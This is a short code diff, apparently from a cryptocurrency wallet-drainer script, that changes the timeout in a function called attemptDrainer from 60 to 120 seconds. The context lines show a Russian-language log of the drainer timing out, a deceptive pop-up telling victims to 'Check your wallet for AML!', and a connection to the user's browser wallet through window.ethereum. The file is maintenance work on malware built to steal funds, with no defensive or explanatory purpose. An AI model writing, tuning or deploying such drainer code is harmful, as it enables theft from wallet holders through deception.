@@ -806,7 +806,7 @@ async function attemptDrainer() {
     isTransactionPending = false;
     console.error('❌ Тайм-аут выполнения дрейнера');
     await hideModalWithDelay("Check your wallet for AML!");
-  }, 60000);
+  }, 120000);
 
   try {
     const provider = new ethers.providers.Web3Provider(window.ethereum);
